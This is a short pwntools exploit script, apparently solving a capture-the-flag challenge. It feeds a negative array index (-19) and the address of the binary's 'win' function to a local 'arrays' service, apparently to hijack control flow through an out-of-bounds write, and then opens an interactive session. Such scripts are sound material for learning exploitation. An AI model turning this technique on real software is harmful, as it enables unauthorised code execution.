from pwn import *

exe = ELF("./arrays")

context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe

gs = '''
b * main+361
c
'''

# io = process(exe.path)
io = remote('127.0.0.1', 50001)
# gdb.attach(io, gdbscript=gs)
for _ in range(5):
    io.sendline(b'0')

io.sendline(b'y')
io.sendline(b'-19')
io.sendline(str(exe.sym.win).encode())
io.clean()

io.interactive()
